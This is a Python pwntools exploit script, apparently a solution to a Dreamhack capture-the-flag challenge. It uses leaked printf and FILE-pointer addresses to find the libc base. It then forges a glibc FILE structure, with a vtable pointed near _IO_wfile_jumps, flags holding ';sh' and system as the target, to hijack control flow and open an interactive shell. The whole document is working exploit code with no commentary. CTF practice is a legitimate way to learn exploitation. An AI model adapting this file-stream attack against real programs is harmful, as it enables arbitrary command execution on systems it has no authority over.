#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./main')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 21924".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

ru(b'printf:')
printf = int(rl().strip(), 16)

ru(b'fp:')
v1 = int(rl().strip(), 16) # r/w addr, is fp itself.

lb = printf - libc.sym["printf"]
libc.address = lb

# for the debug purposes
slog("printf", printf)
slog("libc_base", lb)
slog("fp", v1)

fp = FileStructure()
fp.flags = b'\x01'*4 + b';sh'
fp._IO_write_ptr = 0x10
fp.markers = libc.sym["system"]
fp._lock = v1 + 0x100
fp._wide_data = v1
fp.unknown2 = 0xffffffff
fp.vtable = libc.sym["_IO_wfile_jumps"] - 0x30

pay = bytes(fp) + p64(v1 - 0x8)
print(hex(len(pay)))

sl(pay)

p.interactive()